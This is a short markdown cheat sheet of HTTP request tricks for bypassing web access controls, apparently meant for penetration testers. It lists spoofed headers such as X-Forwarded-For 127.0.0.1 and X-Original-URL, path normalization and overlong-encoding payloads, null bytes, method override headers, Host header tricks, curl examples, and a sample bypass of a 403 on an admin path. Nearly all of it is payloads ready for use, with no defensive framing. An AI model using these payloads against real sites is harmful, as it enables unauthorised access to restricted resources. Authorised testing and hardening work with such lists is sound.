# HTTP Request Bypass Techniques

## Common Headers

- **User-Agent Header**
  - `User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)`

- **Referer Header**
  - `Referer: <target>`

- **X-Forwarded Headers**
  - `X-Forwarded-For: 127.0.0.1`
  - `X-Forwarded-Host: <host>`
  - `X-Original-URL: /`

- **Origin Header**
  - `Origin: <target>`

## Path Traversal and Normalization Tricks

- `GET /%2e HTTP/1.1`
- `GET /. HTTP/1.1`
- `GET /./ HTTP/1.1`
- `GET /..;/ HTTP/1.1`

## HTTP Method Manipulation

- `HEAD / HTTP/1.1`

## Host Header Attacks

- `Host: <target>`
- `X-Host: <trusted host>`

## Encoded Path Bypass Attempts

- `GET /%252e HTTP/1.1`
- `GET /%2e%2e/ HTTP/1.1`
- `GET /%2f HTTP/1.1`

## Unicode and Encoding Tricks

- `GET /%c0%af HTTP/1.1`
- `GET /%e0%80%af HTTP/1.1`

## Null Byte Injection

- `GET /%00 HTTP/1.1`
- `GET /%00/ HTTP/1.1`

## Content-Length Manipulation

- `Content-Length: 0`
- `Content-Length: 16`

## HTTP Method Override Headers

- `X-Original-Method: GET`
- `X-Http-Method-Override: GET`

## HTTP Version Spoofing

- `GET / HTTP/< change to 1.0 / 1.1 / 2 >`

## Conflicting Method and Header

- `GET / HTTP/1.1`
- `X-HTTP-Method: POST`

## `curl` Examples

- `curl -H "Host: another-allowed-host.com" --resolve "sub.target.com:443:XX.XX.XX.XX" <target>`
- `curl -H "X-Forwarded-For: 1.1.1.1" <target>`

## 403 Bypass Example

- If `403 Forbidden` on `target.com/admin`, try:
  - `target.com/%2e/admin`


